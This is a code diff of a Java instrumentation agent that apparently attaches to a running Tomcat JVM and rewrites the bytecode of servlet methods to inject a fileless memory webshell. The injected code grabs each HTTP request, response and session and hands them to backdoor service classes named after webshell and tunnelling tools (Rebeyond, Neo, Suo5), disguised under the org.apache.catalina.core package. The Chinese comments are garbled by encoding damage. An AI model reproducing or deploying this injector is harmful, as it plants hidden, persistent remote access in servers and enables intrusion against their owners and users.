@@ -15,35 +15,35 @@ import java.util.HashMap;
 public class AgenstMain {
 
     public static void main(String[] args){
-        //SB VSCODE å¤©å¤© åæˆ‘ç¼–ç 
-        //æˆ‘çš„æ³¨é‡Šï¼
+        //SB VSCODE ÌìÌì ÍÌÎÒ±àÂë
+        //ÎÒµÄ×¢ÊÍ£¡
         try{
-            AttachA.doAttach("");
+            AttachA.doAttach(args.toString());
         } catch (AgentLoadException | IOException | AgentInitializationException e) {
-            throw new RuntimeException(e);  //ä¸æ‰“ç®—å¤„ç†ä½†ä¾ç„¶å†™äº†
+            throw new RuntimeException(e);  //²»´òËã´¦Àíµ«ÒÀÈ»Ğ´ÁË
         }
 
     }
 
     public static void premain(String agentArgs, Instrumentation ins){
-        //è¿™ä¸ªæ–¹æ³•ä½œä¸ºagentæ—¶çš„å…¥å£
+        //Õâ¸ö·½·¨×÷ÎªagentÊ±µÄÈë¿Ú
         System.out.println("hello111111");
         TransformerA.init();
-        HashMap<String, String[]> hm = AttachA.findAttachClasses(); //æ‡’å¾—å†™æ³¨é‡Šäº†ï¼Œè¦æ€ªè¯·æ€ªVSCODE
+        HashMap<String, String[]> hm = AttachA.findAttachClasses(); //ÀÁµÃĞ´×¢ÊÍÁË£¬Òª¹ÖÇë¹ÖVSCODE
         Class[] classes = ins.getAllLoadedClasses();
-        //æšä¸¾æ‰€æœ‰å·²åŠ è½½ç±»ï¼Œç„¶åæ£€æŸ¥æˆ‘ä»¬çš„æ³¨å…¥å™¨ä¸­æ˜¯å¦åŒ…å«è¿™äº›
+        //Ã¶¾ÙËùÓĞÒÑ¼ÓÔØÀà£¬È»ºó¼ì²éÎÒÃÇµÄ×¢ÈëÆ÷ÖĞÊÇ·ñ°üº¬ÕâĞ©
         for (Class c : classes) {
             if (hm.containsKey(c.getName())) {
-                System.out.println("åŒ¹é…åˆ°ç›®æ ‡ç±»ï¼");;
-                //å¦‚æœåŒ…å«å‘¢ï¼Œé‚£å°±ä½¿ç”¨Transformerå¯¹å…¶å­—èŠ‚ç è¿›è¡Œæ³¨å…¥
-                for(String mN : hm.get(c.getName())){ //éå†åˆ—è¡¨å–å‡ºæ‰€æœ‰è¦æ³¨å…¥çš„æ–¹æ³•
+                System.out.println("Æ¥Åäµ½Ä¿±êÀà£¡");;
+                //Èç¹û°üº¬ÄØ£¬ÄÇ¾ÍÊ¹ÓÃTransformer¶ÔÆä×Ö½ÚÂë½øĞĞ×¢Èë
+                for(String mN : hm.get(c.getName())){ //±éÀúÁĞ±íÈ¡³öËùÓĞÒª×¢ÈëµÄ·½·¨
                     TransformerA tA = new TransformerA(mN,c.getName()); 
                     tA.setSourceCode("{System.out.println(\"Hello!\");}");
                     ins.addTransformer(tA, true);
                     try {
                         ins.retransformClasses(c);
                     } catch (UnmodifiableClassException e) {
-                        System.out.println(mN+"------"+c.getName()+"------"+"ä¸å¯æ³¨å…¥ï¼");
+                        System.out.println(mN+"------"+c.getName()+"------"+"²»¿É×¢Èë£¡");
                     }
                 }
 
@@ -53,17 +53,17 @@ public class AgenstMain {
     }
 
     public static void agentmain(String agentArgs, Instrumentation ins){
-        //è¿™ä¸ªæ–¹æ³•ä½œä¸ºagentæ—¶çš„å…¥å£
+        //Õâ¸ö·½·¨×÷ÎªagentÊ±µÄÈë¿Ú
         System.out.println("hello1111112");
         TransformerA.init();
-        HashMap<String, String[]> hm = AttachA.findAttachClasses(); //æ‡’å¾—å†™æ³¨é‡Šäº†ï¼Œè¦æ€ªè¯·æ€ªVSCODE
+        HashMap<String, String[]> hm = AttachA.findAttachClasses(); //ÀÁµÃĞ´×¢ÊÍÁË£¬Òª¹ÖÇë¹ÖVSCODE
         Class[] classes = ins.getAllLoadedClasses();
-        //æšä¸¾æ‰€æœ‰å·²åŠ è½½ç±»ï¼Œç„¶åæ£€æŸ¥æˆ‘ä»¬çš„æ³¨å…¥å™¨ä¸­æ˜¯å¦åŒ…å«è¿™äº›
+        //Ã¶¾ÙËùÓĞÒÑ¼ÓÔØÀà£¬È»ºó¼ì²éÎÒÃÇµÄ×¢ÈëÆ÷ÖĞÊÇ·ñ°üº¬ÕâĞ©
         for (Class c : classes) {
             if (hm.containsKey(c.getName())) {
-                System.out.println("åŒ¹é…åˆ°ç›®æ ‡ç±»ï¼");;
-                //å¦‚æœåŒ…å«å‘¢ï¼Œé‚£å°±ä½¿ç”¨Transformerå¯¹å…¶å­—èŠ‚ç è¿›è¡Œæ³¨å…¥
-                for(String mN : hm.get(c.getName())){ //éå†åˆ—è¡¨å–å‡ºæ‰€æœ‰è¦æ³¨å…¥çš„æ–¹æ³•
+                System.out.println("Æ¥Åäµ½Ä¿±êÀà£¡");;
+                //Èç¹û°üº¬ÄØ£¬ÄÇ¾ÍÊ¹ÓÃTransformer¶ÔÆä×Ö½ÚÂë½øĞĞ×¢Èë
+                for(String mN : hm.get(c.getName())){ //±éÀúÁĞ±íÈ¡³öËùÓĞÒª×¢ÈëµÄ·½·¨
                     TransformerA tA = new TransformerA(mN,c.getName());
                     tA.setSourceCode("{" +
                             "javax.servlet.http.HttpServletRequest request=(javax.servlet.http.HttpServletRequest)$1;\n" +
@@ -77,12 +77,15 @@ public class AgenstMain {
                             "s.put(\"response\",response);\n" +
                             "s.put(\"session\",request.getSession());" +
                             "org.apache.catalina.core.RebeyondServices.doServices(rdd,s);" +
-                            "}"); //å‰ç½®ï¼Œåœ¨è¢«æ³¨å…¥ç¯å¢ƒå†…è·å–æ‰€æœ‰éœ€è¦çš„å†…å®¹ï¼Œç„¶åè¿›å…¥agentç¯å¢ƒ
+                            "org.apache.catalina.core.ExtendServices.doServices(rdd,s);" +
+                          //"org.apache.catalina.core.Suo5Services.doServices(rdd,s);" + //ÆôÓÃ´Ë¹¦ÄÜĞèÒªÖØĞÂ±àÒë£¬Çë¿´Suo5Services
+                            "org.apache.catalina.core.NeoServices.doServices(rdd,s);" +
+                            "}"); //Ç°ÖÃ£¬ÔÚ±»×¢Èë»·¾³ÄÚ»ñÈ¡ËùÓĞĞèÒªµÄÄÚÈİ£¬È»ºó½øÈëagent»·¾³
                     try {
                         ClassDefinition cd=new ClassDefinition(c, tA.getBytes(c));
                         ins.redefineClasses(cd);
                     } catch (UnmodifiableClassException e) {
-                        System.out.println(mN+"------"+c.getName()+"------"+"ä¸å¯æ³¨å…¥ï¼");
+                        System.out.println(mN+"------"+c.getName()+"------"+"²»¿É×¢Èë£¡");
                     } catch (ClassNotFoundException e) {
                         throw new RuntimeException(e);
                     }
